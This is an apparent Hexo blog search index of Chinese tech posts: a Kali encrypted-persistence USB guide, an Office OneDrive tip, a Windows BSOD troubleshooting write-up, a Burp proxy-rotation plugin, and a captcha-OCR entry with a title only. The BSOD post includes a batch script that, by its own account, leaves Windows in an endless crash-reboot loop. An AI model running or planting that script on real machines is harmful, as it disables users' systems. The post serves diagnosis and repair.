<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>在 U 盘上安装带加密持久化的 Kali Linux</title>
    <link href="/2025/10/19/%E5%9C%A8%20U%20%E7%9B%98%E4%B8%8A%E5%AE%89%E8%A3%85%E5%B8%A6%E5%8A%A0%E5%AF%86%E6%8C%81%E4%B9%85%E5%8C%96%E7%9A%84%20Kali%20Linux/"/>
    <url>/2025/10/19/%E5%9C%A8%20U%20%E7%9B%98%E4%B8%8A%E5%AE%89%E8%A3%85%E5%B8%A6%E5%8A%A0%E5%AF%86%E6%8C%81%E4%B9%85%E5%8C%96%E7%9A%84%20Kali%20Linux/</url>
    
    <content type="html"><![CDATA[<blockquote><p>本文介绍如何在 U 盘上写入 Kali Live 系统并为持久化数据创建 <strong>LUKS 加密分区</strong>（即加密 persistence）。<br><strong>操作会清除 U 盘上的所有数据</strong>，请务必备份并确认目标设备（例如 <code>/dev/sdb</code>）无误后再执行命令。⚠️</p></blockquote><hr><h2 id="准备工作-✅"><a href="#准备工作-✅" class="headerlink" title="准备工作 ✅"></a>准备工作 ✅</h2><ol><li>一张 U 盘（建议 16GB 及以上，实际大小越大持久化空间越多）。</li><li>Kali Linux 的 ISO 文件（例如 <code>kali-linux-2019.2-amd64.iso</code>）。</li><li>一台 Linux 电脑（含 <code>dd</code>, <code>parted</code>, <code>cryptsetup</code>, <code>mkfs.ext4</code>, <code>e2label</code> 等工具）。</li><li>提示：下面的命令需要 root 权限，请在命令前加 <code>sudo</code> 或切换到 root 执行。</li></ol><hr><h2 id="整体思路-🧭"><a href="#整体思路-🧭" class="headerlink" title="整体思路 🧭"></a>整体思路 🧭</h2><ol><li>用 <code>dd</code> 将 Kali ISO 写入整个 U 盘，创建一个可引导的 Live USB。</li><li>使用 <code>parted</code> 在 U 盘上创建一个新的分区用于持久化（不会破坏已写入的 Live 系统分区，只是在剩余空间上新建分区）。</li><li>对该分区进行 LUKS 加密（<code>cryptsetup luksFormat</code>），打开映射并格式化为 ext4。</li><li>在该文件系统根下创建 <code>persistence.conf</code>，配置为 <code>/ union</code>（Kali Live 的持久化约定），然后卸载并关闭 LUKS 映射。</li><li>启动 Kali Live 时选择带持久化的启动项即可使用加密的持久化分区。</li></ol><hr><h2 id="详细步骤（示例命令）-🛠️"><a href="#详细步骤（示例命令）-🛠️" class="headerlink" title="详细步骤（示例命令） 🛠️"></a>详细步骤（示例命令） 🛠️</h2><blockquote><p><strong>重要</strong>：下面示例使用的设备是 <code>/dev/sdb</code>，请务必先确认你的 U 盘设备节点（例如使用 <code>lsblk</code> &#x2F; <code>fdisk -l</code>）并替换为实际设备路径，误用会导致数据不可恢复的丢失。</p></blockquote><h3 id="1-写入-ISO（将会覆盖整个-U-盘）"><a href="#1-写入-ISO（将会覆盖整个-U-盘）" class="headerlink" title="1. 写入 ISO（将会覆盖整个 U 盘）"></a>1. 写入 ISO（将会覆盖整个 U 盘）</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 将 ISO 写入 /dev/sdb（注意是整个设备，不是分区 /dev/sdb1）</span><br>sudo <span class="hljs-built_in">dd</span> <span class="hljs-keyword">if</span>=kali-linux-2019.2-amd64.iso of=/dev/sdb bs=1M status=progress &amp;&amp; <span class="hljs-built_in">sync</span><br></code></pre></td></tr></table></figure><ul><li><code>bs=1M</code>：每次读取写入 1MB，提高速度。</li><li><code>status=progress</code>：显示写入进度（某些 dd 版本支持）。</li><li><code>sync</code>：刷新缓存，确保数据写完。</li></ul><p>写入后，U 盘会有 Live 系统的分区表（通常包含一个 FAT&#x2F;ISO 9660 或者 squashfs），但通常还有未分配的剩余空间 —— 我们将在剩余空间上创建持久化分区。</p><hr><h3 id="2-确认设备与分区情况"><a href="#2-确认设备与分区情况" class="headerlink" title="2. 确认设备与分区情况"></a>2. 确认设备与分区情况</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">lsblk<br>sudo fdisk -l /dev/sdb<br></code></pre></td></tr></table></figure><p>查看输出，确认 <code>/dev/sdb</code> 上已有的分区（例如 <code>/dev/sdb1</code>, <code>/dev/sdb2</code> 等）以及未分配空间开始和结束的扇区或 MB 范围。我们需要知道可用的起始&#x2F;结束位置以便创建持久化分区。</p><hr><h3 id="3-使用-parted-创建持久化分区"><a href="#3-使用-parted-创建持久化分区" class="headerlink" title="3. 使用 parted 创建持久化分区"></a>3. 使用 parted 创建持久化分区</h3><p>下面命令演示如何在设备上创建一个主分区（调整开始&#x2F;结束值以适配你的 U 盘）：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo parted /dev/sdb --script mkpart primary 3354MiB 13600MiB<br></code></pre></td></tr></table></figure><ul><li><code>3354MiB</code> &#x2F; <code>13600MiB</code> 是示例的起始与结束位置（单位可用 MB 或 MiB），请根据 <code>fdisk</code>&#x2F;<code>lsblk</code> 的输出调整。</li><li>你也可以使用扇区号或百分比来指定分区位置。</li><li>创建后会生成一个新的分区（比如 <code>/dev/sdb3</code>）。注意分区编号可能不同，请以 <code>lsblk</code> 显示为准。</li></ul><p>如果你更喜欢交互式操作也可直接运行 <code>sudo parted /dev/sdb</code> 然后在提示符下使用 <code>mkpart</code>。</p><hr><h3 id="4-对分区进行-LUKS-加密并打开映射"><a href="#4-对分区进行-LUKS-加密并打开映射" class="headerlink" title="4. 对分区进行 LUKS 加密并打开映射"></a>4. 对分区进行 LUKS 加密并打开映射</h3><p>假设刚创建的分区为 <code>/dev/sdb3</code>，使用 LUKS（加密）格式化并打开，映射名为 <code>usb</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># LUKS 格式化（会要求你输入并确认一个 passphrase）</span><br>sudo cryptsetup --verbose --verify-passphrase luksFormat /dev/sdb3<br><br><span class="hljs-comment"># 打开映射，映射名称 usb -&gt; /dev/mapper/usb</span><br>sudo cryptsetup luksOpen /dev/sdb3 usb<br></code></pre></td></tr></table></figure><ul><li><code>--verify-passphrase</code>：在格式化时要求确认密码。</li><li>记住你设置的 passphrase，用于以后解密（如果遗忘将无法恢复数据）。</li></ul><hr><h3 id="5-在映射上创建文件系统并标注"><a href="#5-在映射上创建文件系统并标注" class="headerlink" title="5. 在映射上创建文件系统并标注"></a>5. 在映射上创建文件系统并标注</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 在解密映射上创建 ext4 文件系统</span><br>sudo mkfs.ext4 /dev/mapper/usb<br><br><span class="hljs-comment"># 给文件系统设置标签（可选），这里用 persistence 标签</span><br>sudo e2label /dev/mapper/usb persistence<br></code></pre></td></tr></table></figure><hr><h3 id="6-挂载并配置持久化"><a href="#6-挂载并配置持久化" class="headerlink" title="6. 挂载并配置持久化"></a>6. 挂载并配置持久化</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 创建挂载点并挂载</span><br>sudo <span class="hljs-built_in">mkdir</span> -p /mnt/usb<br>sudo mount /dev/mapper/usb /mnt/usb<br><br><span class="hljs-comment"># 创建 persistence 配置文件，Kali Live 识别 &quot;/ union&quot; 表示持久化根目录</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;/ union&quot;</span> | sudo <span class="hljs-built_in">tee</span> /mnt/usb/persistence.conf<br><br><span class="hljs-comment"># 同步并卸载</span><br><span class="hljs-built_in">sync</span><br>sudo umount /mnt/usb<br><br><span class="hljs-comment"># 关闭 LUKS 映射</span><br>sudo cryptsetup luksClose /dev/mapper/usb<br></code></pre></td></tr></table></figure><ul><li><code>persistence.conf</code> 内容 <code>&quot;/ union&quot;</code> 表示将持久化数据映射到根目录，从而保留系统设置与安装的软件等。</li><li>你也可以在分区上创建 <code>persistence</code> 目录并放置特定子目录规则，详见 Kali 官方文档（如果需要我可以另外补充）。</li></ul><hr><h2 id="启动并使用持久化加密-U-盘-🎯"><a href="#启动并使用持久化加密-U-盘-🎯" class="headerlink" title="启动并使用持久化加密 U 盘 🎯"></a>启动并使用持久化加密 U 盘 🎯</h2><ol><li>将 U 盘插入目标电脑，启动并选择从 USB 启动（进入 BIOS&#x2F;UEFI 或选择启动菜单）。</li><li>在启动菜单里选择 <strong>Kali Live (persistence)</strong> 或 <strong>Live USB persistence</strong>（不同版本菜单字样不同）。</li><li>系统启动时会提示你输入 LUKS passphrase（你在第 4 步设置的密码），输入后即可挂载加密分区并启用持久化。</li><li>若未看到带 persistence 的选项，可能需要在启动菜单的 <code>Advanced options</code> 或 <code>Live</code> 子菜单中选择，或参照 Kali 官方 Live USB persistence 使用方法。</li></ol><hr><h2 id="常见问题与排查-🔍"><a href="#常见问题与排查-🔍" class="headerlink" title="常见问题与排查 🔍"></a>常见问题与排查 🔍</h2><ul><li><p><strong>找不到分区 <code>/dev/sdb3</code>？</strong></p><ul><li>可能分区编号不同，使用 <code>lsblk</code> &#x2F; <code>sudo fdisk -l /dev/sdb</code> 确认实际设备名。</li></ul></li><li><p><strong>写入 ISO 后没有剩余空间</strong>：</p><ul><li>某些 ISO 会占用整个设备或创建分区表不留空闲，可能需要在写入后使用 <code>gparted</code> 调整或手动重新分区（风险较高，请小心）。</li></ul></li><li><p><strong>启动没有看到 persistence 选项</strong>：</p><ul><li>有些 Kali ISO 的启动菜单变量名不同，确保 ISO 支持 persistence（官方 Live ISO 通常支持）。</li></ul></li><li><p><strong>忘记 LUKS 密码</strong>：</p><ul><li>无法恢复，请务必妥善保管密码或使用密码管理器。</li></ul></li></ul><hr><h2 id="小结-✨"><a href="#小结-✨" class="headerlink" title="小结 ✨"></a>小结 ✨</h2><p>通过上述步骤，你可以得到一个 <strong>可引导且带有 LUKS 加密持久化分区的 Kali Live USB</strong>：</p><ul><li>Live 系统无修改风险（系统以只读镜像运行）；</li><li>所有个人配置与数据存储在加密的持久化分区中，断电后内容仍受加密保护；</li><li>适合希望在可移动介质上保存私人配置但又需要一定安全保障的场景。</li></ul><p>如果你希望我把这些步骤整理成可执行的脚本（交互式询问设备与大小）、或补充如何在 Windows 下写入 ISO（使用 Rufus 等工具），或生成图文教程与截图，我可以继续帮你完善。🔧😄</p>]]></content>
    
    
    <categories>
      
      <category>kali</category>
      
    </categories>
    
    
    <tags>
      
      <tag>kali</tag>
      
      <tag>persistence</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>如何关闭 Office 文档中的 OneDrive 备份提示</title>
    <link href="/2025/08/21/%E5%A6%82%E4%BD%95%E5%85%B3%E9%97%ADOffice%E6%96%87%E6%A1%A3%E4%B8%AD%E7%9A%84OneDrive%E5%A4%87%E4%BB%BD%E6%8F%90%E7%A4%BA/"/>
    <url>/2025/08/21/%E5%A6%82%E4%BD%95%E5%85%B3%E9%97%ADOffice%E6%96%87%E6%A1%A3%E4%B8%AD%E7%9A%84OneDrive%E5%A4%87%E4%BB%BD%E6%8F%90%E7%A4%BA/</url>
    
    <content type="html"><![CDATA[<p>在日常使用 <strong>Word &#x2F; Excel &#x2F; PowerPoint</strong> 时，很多朋友可能遇到过这样一个烦人的情况：<br>每次打开或新建文档时，功能区下方都会跳出一个黄色提示条 ⬇️：</p><blockquote><p><strong>⚠️ 备份此文档 使用你的订阅中包含的 OneDrive 随时随地访问此文件。</strong></p></blockquote><p><img src="https://learn-attachment.microsoft.com/api/attachments/cf5a8ca7-a784-4177-afb7-f9e78595307f?platform=QnA" alt="img"></p><p>如果你并不打算用 OneDrive 来保存文件，这些提示就显得非常碍眼。这里分享一个 ✅ <strong>有效的解决方案</strong>。</p><hr><h2 id="🔧-解决方法"><a href="#🔧-解决方法" class="headerlink" title="🔧 解决方法"></a>🔧 解决方法</h2><p>1️⃣ 打开任意一个 Office 应用（如 Word 或 Excel）；<br>2️⃣ 点击左上角 <strong>文件 → 选项</strong>；<br>3️⃣ 在弹出的窗口中，切换到 <strong>保存</strong> 页面；<br>4️⃣ 找到：<br>   <strong>“显示其他保存位置（即使可能需要登录）(S)”</strong><br>5️⃣ ❌ 取消勾选；<br>6️⃣ 点击 <strong>确定</strong> 保存设置。  </p><hr><h2 id="🎉-效果展示"><a href="#🎉-效果展示" class="headerlink" title="🎉 效果展示"></a>🎉 效果展示</h2><p>设置完成后，Office 在保存或打开文档时将不再提示使用 OneDrive：<br>✨ 黄色提示条彻底消失，界面清爽干净；<br>✨ 文件依旧可以正常保存到本地，不受任何影响。  </p><hr><h2 id="📝-总结"><a href="#📝-总结" class="headerlink" title="📝 总结"></a>📝 总结</h2><p>微软在 Office 中集成 OneDrive 是为了方便云端协作和跨设备访问。<br>但如果你只习惯在本地管理文档 📂，这类提醒就完全是“打扰”。  </p><p>只需要简单关闭 <strong>“显示其他保存位置”</strong>，就能让 Office 界面变得安静许多。<br>👉 一个小小的设置，让办公体验更轻松！</p>]]></content>
    
    
    
    <tags>
      
      <tag>OneDrive</tag>
      
      <tag>使用技巧</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Windows 因 OSDATA 文件夹导致的蓝屏无限重启问题分析与解决</title>
    <link href="/2025/08/16/Windows%20%E5%9B%A0%20OSDATA%20%E6%96%87%E4%BB%B6%E5%A4%B9%E5%AF%BC%E8%87%B4%E7%9A%84%E8%93%9D%E5%B1%8F%E6%97%A0%E9%99%90%E9%87%8D%E5%90%AF%E9%97%AE%E9%A2%98%E5%88%86%E6%9E%90%E4%B8%8E%E8%A7%A3%E5%86%B3/"/>
    <url>/2025/08/16/Windows%20%E5%9B%A0%20OSDATA%20%E6%96%87%E4%BB%B6%E5%A4%B9%E5%AF%BC%E8%87%B4%E7%9A%84%E8%93%9D%E5%B1%8F%E6%97%A0%E9%99%90%E9%87%8D%E5%90%AF%E9%97%AE%E9%A2%98%E5%88%86%E6%9E%90%E4%B8%8E%E8%A7%A3%E5%86%B3/</url>
    
    <content type="html"><![CDATA[<h1 id="Windows-因-OSDATA-文件夹导致的蓝屏无限重启问题分析与解决"><a href="#Windows-因-OSDATA-文件夹导致的蓝屏无限重启问题分析与解决" class="headerlink" title="Windows 因 OSDATA 文件夹导致的蓝屏无限重启问题分析与解决"></a>Windows 因 OSDATA 文件夹导致的蓝屏无限重启问题分析与解决</h1><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>最近在处理一台 Windows 设备时，遇到一个非常棘手的问题：系统开机后反复出现蓝屏（代码：CONFIG LIST FAILED），自动重启，完全无法进入桌面。经过排查发现，问题竟然与 <code>C:\Windows\System32\config</code> 目录下的一个名为 <code>OSDATA</code> 的文件夹 有关。这个目录通常存放 Windows 的核心注册表配置文件，而额外的异常文件夹可能干扰了系统的正常启动流程。</p><h2 id="问题表现"><a href="#问题表现" class="headerlink" title="问题表现"></a>问题表现</h2><ul><li>开机 → 出现蓝屏错误（终止代码：CONFIG LIST FAILED）</li><li>系统自动重启</li><li>无法进入桌面，进入 <strong>蓝屏 → 重启 → 蓝屏</strong> 的死循环</li></ul><p>这种现象通常意味着 Windows 内核或关键配置被破坏或干扰。</p><h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><ul><li>该问题主要出现在 <strong>Windows 10 1709 及之后版本</strong>，包括后续 Windows 10 更新和部分 Windows 11 系统。</li><li>影响的系统模块涉及 <strong>核心注册表访问和内核调用</strong>，尤其是在访问 <code>C:\Windows\System32\config\OSDATA</code> 路径时。</li><li>在受影响的系统中，如果该路径下存在异常文件或文件夹（非系统默认生成），可能导致 <strong>蓝屏循环重启</strong>。</li></ul><h2 id="复现方式"><a href="#复现方式" class="headerlink" title="复现方式"></a>复现方式</h2><p>在分析过程中发现，Windows 内核或某些系统调用（包括 Xbox 相关模块）会尝试访问 C:\Windows\System32\config\OSDATA 路径下的文件。如果该路径下存在异常文件或文件夹（被人为添加或篡改），系统无法找到预期的文件，就会触发严重的内核错误，导致 蓝屏循环重启。</p><p>⚠️ 警告：该目录为系统关键配置区，非专业操作可能造成不可逆系统损坏，请勿随意修改。</p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bat">@<span class="hljs-built_in">echo</span> off<br><span class="hljs-comment">REM 检查管理员权限</span><br><span class="hljs-built_in">net</span> session &gt;<span class="hljs-built_in">nul</span> <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> <span class="hljs-variable">%errorlevel%</span> <span class="hljs-keyword">neq</span> <span class="hljs-number">0</span> (<br>    <span class="hljs-built_in">echo</span> 请以管理员身份运行此脚本！<br>    <span class="hljs-built_in">pause</span><br>    <span class="hljs-keyword">exit</span> /b<br>)<br><span class="hljs-comment"></span><br><span class="hljs-comment">REM 在系统目录中创建 OSDATA 文件夹</span><br><span class="hljs-built_in">mkdir</span> C:\Windows\System32\config\OSDATA<br><span class="hljs-built_in">echo</span> 已创建 C:\Windows\System32\config\OSDATA<br><span class="hljs-built_in">pause</span><br></code></pre></td></tr></table></figure><p>运行后重启系统，就会出现蓝屏循环的问题。</p><h2 id="排查思路"><a href="#排查思路" class="headerlink" title="排查思路"></a>排查思路</h2><ol><li><p><strong>进入恢复模式 (WinRE)</strong></p><ul><li>多次强制关机（长按电源键） → 自动进入 <strong>修复模式</strong></li><li>选择：<code>疑难解答 → 高级选项 → 命令提示符</code></li></ul></li><li><p><strong>检查系统配置目录</strong><br>在命令提示符下输入：</p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bat"><span class="hljs-built_in">dir</span> C:\Windows\System32\config<br></code></pre></td></tr></table></figure><p>结果发现多了一个 <strong>OSDATA 文件夹</strong>。</p></li><li><p><strong>推测原因</strong></p><ul><li>Windows 在启动过程中需要访问 <code>System32\config</code> 下的注册表配置文件。</li><li>出现异常的 <strong>OSDATA 文件夹</strong>，可能导致系统在解析配置时冲突，从而触发蓝屏。</li></ul></li></ol><h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><p>在恢复模式的命令提示符下，执行以下命令删除该文件夹：</p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bat"><span class="hljs-built_in">rd</span> /s /q C:\Windows\System32\config\OSDATA<br></code></pre></td></tr></table></figure><p>解释：</p><ul><li><code>rd</code> 或 <code>rmdir</code> → 删除目录</li><li><code>/s</code> → 删除目录及其下的所有子目录和文件</li><li><code>/q</code> → 静默模式，不会反复询问</li></ul><p>删除完成后，输入 <code>exit</code> 并选择 <strong>继续启动 Windows</strong>，此时系统能够正常进入桌面。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul><li><code>C:\Windows\System32\config</code> 是 Windows 的核心系统配置目录，正常情况下，该目录下不应存在 OSDATA 文件夹，否则可能干扰内核访问预期文件，导致系统异常。</li><li>运行创建该目录的 bat 脚本后，会导致 <strong>蓝屏 + 无限重启</strong> 问题。</li><li>解决方法是通过 <strong>WinRE 命令行删除该文件夹</strong>，即可恢复系统正常运行。</li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>系统异常</tag>
      
      <tag>蓝屏重启</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>一个轻量、高效、稳定的 Burp 扩展，用于快速导入、验证、管理和切换代理，支持 HTTP 和 SOCKS5</title>
    <link href="/2025/07/11/%E4%B8%80%E4%B8%AA%E8%BD%BB%E9%87%8F%E3%80%81%E9%AB%98%E6%95%88%E3%80%81%E7%A8%B3%E5%AE%9A%E7%9A%84%20Burp%20%E6%89%A9%E5%B1%95%EF%BC%8C%E7%94%A8%E4%BA%8E%E5%BF%AB%E9%80%9F%E5%AF%BC%E5%85%A5%E3%80%81%E9%AA%8C%E8%AF%81%E3%80%81%E7%AE%A1%E7%90%86%E5%92%8C%E5%88%87%E6%8D%A2%E4%BB%A3%E7%90%86%EF%BC%8C%E6%94%AF%E6%8C%81%20HTTP%20%E5%92%8C%20SOCKS5/"/>
    <url>/2025/07/11/%E4%B8%80%E4%B8%AA%E8%BD%BB%E9%87%8F%E3%80%81%E9%AB%98%E6%95%88%E3%80%81%E7%A8%B3%E5%AE%9A%E7%9A%84%20Burp%20%E6%89%A9%E5%B1%95%EF%BC%8C%E7%94%A8%E4%BA%8E%E5%BF%AB%E9%80%9F%E5%AF%BC%E5%85%A5%E3%80%81%E9%AA%8C%E8%AF%81%E3%80%81%E7%AE%A1%E7%90%86%E5%92%8C%E5%88%87%E6%8D%A2%E4%BB%A3%E7%90%86%EF%BC%8C%E6%94%AF%E6%8C%81%20HTTP%20%E5%92%8C%20SOCKS5/</url>
    
    <content type="html"><![CDATA[<h1 id="Proxy-Switcher-v2-0"><a href="#Proxy-Switcher-v2-0" class="headerlink" title="Proxy Switcher v2.0"></a>Proxy Switcher v2.0</h1><p><strong>Burp Suite 代理切换插件</strong><br>一个轻量、高效、稳定的 Burp 扩展，用于快速导入、验证、管理和切换代理，支持 HTTP 和 SOCKS5。</p><p>项目地址：<a href="https://github.com/gh0stNinja/ProxySwitcher">https://github.com/gh0stNinja/ProxySwitcher</a></p><hr><h2 id="特性"><a href="#特性" class="headerlink" title="特性"></a>特性</h2><table><thead><tr><th>功能</th><th>说明</th></tr></thead><tbody><tr><td><strong>延迟显示</strong></td><td>显示每个代理的响应延迟（ms）</td></tr><tr><td><strong>不跳过慢速代理</strong></td><td>只要能通，即视为可用</td></tr><tr><td><strong>三种切换模式</strong></td><td>随机、轮询、粘性</td></tr><tr><td><strong>右键菜单操作</strong></td><td>删除、设为粘性、复制 cURL、验证、测试</td></tr><tr><td><strong>导入&#x2F;导出</strong></td><td>支持 <code>.txt</code> 文件批量导入导出</td></tr><tr><td><strong>获取代理</strong></td><td>支持从 URL 拉取代理列表</td></tr><tr><td><strong>多语言支持</strong></td><td>中文 &#x2F; English 自动切换</td></tr><tr><td><strong>验证功能</strong></td><td>批量验证 HTTP 和 HTTPS 可用性</td></tr></tbody></table><hr><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><ol><li>打开 <strong>Burp Suite</strong></li><li>进入 <code>Extender</code> → <code>Extensions</code></li><li>点击 <code>Add</code></li><li>选择扩展类型：<strong>Python</strong></li><li>选择 <code>ProxySwitcher.py</code> 文件</li><li>点击 <code>Next</code> → <code>Close</code></li></ol><blockquote><p>插件将出现在 Burp 的标签页中：<strong>Proxy Switcher</strong></p></blockquote><hr><h2 id="使用指南"><a href="#使用指南" class="headerlink" title="使用指南"></a>使用指南</h2><h3 id="1-获取代理"><a href="#1-获取代理" class="headerlink" title="1. 获取代理"></a>1. 获取代理</h3><ul><li>在 <code>地址：</code> 输入框填入代理源 URL（如公开代理 API）</li><li>点击 <code>获取</code></li><li>示例：</li></ul><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>xxx<span class="hljs-regexp">/all/</span><br></code></pre></td></tr></table></figure><h3 id="2-导入代理"><a href="#2-导入代理" class="headerlink" title="2. 导入代理"></a>2. 导入代理</h3><ul><li><p>点击 <code>导入</code></p></li><li><p>选择 <code>.txt</code> 文件（每行一个代理）</p></li><li><p>支持格式：</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">1.2.3.4:8080</span><br>socks5://<span class="hljs-number">5</span>.<span class="hljs-number">6</span>.<span class="hljs-number">7</span>.<span class="hljs-number">8</span>:<span class="hljs-number">1080</span><br></code></pre></td></tr></table></figure></li></ul><h3 id="3-验证代理"><a href="#3-验证代理" class="headerlink" title="3. 验证代理"></a>3. 验证代理</h3><ul><li>点击 <code>验证全部</code> 或右键 → <code>验证全部</code></li><li>验证后：<ul><li><code>OK</code>：HTTP 或 HTTPS 任一可用</li><li><code>FAIL</code>：完全不可用</li><li>显示最小延迟（ms）</li></ul></li></ul><h3 id="4-切换模式"><a href="#4-切换模式" class="headerlink" title="4. 切换模式"></a>4. 切换模式</h3><table><thead><tr><th>模式</th><th>行为</th></tr></thead><tbody><tr><td><strong>随机</strong></td><td>每次请求随机选择一个可用代理</td></tr><tr><td><strong>轮询</strong></td><td>按顺序轮流使用可用代理</td></tr><tr><td><strong>粘性</strong></td><td>固定使用“设为粘性”的代理</td></tr></tbody></table><blockquote><p>切换后日志会提示：<code>模式：随机</code></p></blockquote><h3 id="5-右键菜单"><a href="#5-右键菜单" class="headerlink" title="5. 右键菜单"></a>5. 右键菜单</h3><p>在代理列表右键任意一行：</p><table><thead><tr><th>菜单项</th><th>功能</th></tr></thead><tbody><tr><td><strong>删除代理</strong></td><td>删除选中行</td></tr><tr><td><strong>设为粘性</strong></td><td>固定使用该代理（粘性模式）</td></tr><tr><td><strong>复制为 cURL</strong></td><td>复制 <code>curl -x ...</code> 命令</td></tr><tr><td><strong>验证全部</strong></td><td>重新验证所有代理</td></tr><tr><td><strong>测试选中</strong></td><td>仅验证选中的代理</td></tr><tr><td><strong>移除无效</strong></td><td>删除所有 <code>FAIL</code> 代理</td></tr></tbody></table><hr><h2 id="界面说明"><a href="#界面说明" class="headerlink" title="界面说明"></a>界面说明</h2>  <figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs inform7"><span class="hljs-comment">[启用]</span> <span class="hljs-comment">[中文]</span> 地址：<span class="hljs-comment">[________]</span> <span class="hljs-comment">[获取]</span> <span class="hljs-comment">[模式下拉]</span> <span class="hljs-comment">[验证全部]</span> <span class="hljs-comment">[导入]</span> <span class="hljs-comment">[导出]</span> <span class="hljs-comment">[清空列表]</span> <span class="hljs-comment">[清空日志]</span><br><br>┌──────────────────────────────────────────────────────────────┐<br>│ 代理列表（右键操作）                                           │<br>│ 1.2.3.4:8080     | HTTP    | HTTP   |  128ms | OK         │<br>│ 5.6.7.8:1080     | SOCKS5  | -      |  892ms | OK         │<br>│ ...                                                          │<br>└──────────────────────────────────────────────────────────────┘<br>┌───────────────────────────────────────┐<br>│ 日志                                  │<br>│ Plugin Enabled                        │<br>│ 已获取 128 个代理                     │<br>│ <span class="hljs-comment">[Repeater]</span> Using: 1.2.3.4:8080         │<br>└───────────────────────────────────────┘<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/image-20251030103624415.png" alt="image-20251030103624415"></p><hr><h2 id="导出有效代理"><a href="#导出有效代理" class="headerlink" title="导出有效代理"></a>导出有效代理</h2><ul><li>点击 <code>导出</code></li><li>选择保存路径</li><li>仅导出 <code>OK</code> 的代理（每行一个）</li></ul><hr><h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><ul><li>插件仅在 <strong>Intruder</strong> 和 <strong>Repeater</strong> 中生效</li><li>验证超时：3秒</li><li>不支持用户名密码认证代理</li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>隧道代理</tag>
      
      <tag>burp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>一个基于 Python、ddddocr 和 AIOHTTP 的轻量级验证码识别脚本</title>
    <link href="/2025/07/11/%E4%B8%80%E4%B8%AA%E5%9F%BA%E4%BA%8E%20Python%E3%80%81ddddocr%20%E5%92%8C%20AIOHTTP%20%E7%9A%84%E8%BD%BB%E9%87%8F%E7%BA%A7%E9%AA%8C%E8%AF%81%E7%A0%81%E8%AF%86%E5%88%AB%E8%84%9A%E6%9C%AC/"/>
    <url>/2025/07/11/%E4%B8%80%E4%B8%AA%E5%9F%BA%E4%BA%8E%20Python%E3%80%81ddddocr%20%E5%92%8C%20AIOHTTP%20%E7%9A%84%E8%BD%BB%E9%87%8F%E7%BA%A7%E9%AA%8C%E8%AF%81%E7%A0%81%E8%AF%86%E5%88%AB%E8%84%9A%E6%9C%AC/</url>
    
